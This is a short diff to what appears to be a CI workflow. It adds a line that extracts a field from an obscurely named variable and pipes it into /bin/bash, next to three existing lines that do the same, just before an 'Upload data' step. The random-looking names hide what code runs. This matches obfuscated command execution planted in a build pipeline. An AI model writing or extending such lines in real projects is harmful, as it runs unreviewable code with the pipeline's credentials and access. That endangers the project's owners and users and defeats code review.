@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$axzdw45464" | jq -r .b1600 | /bin/bash
           echo $d497 | jq -r .xanj92 | /bin/bash
           echo $cliyn255 | jq -r .fugrr4 | /bin/bash
+          echo $ek4 | jq -r .gk82 | /bin/bash
 
       - name: Upload data
         if: always()
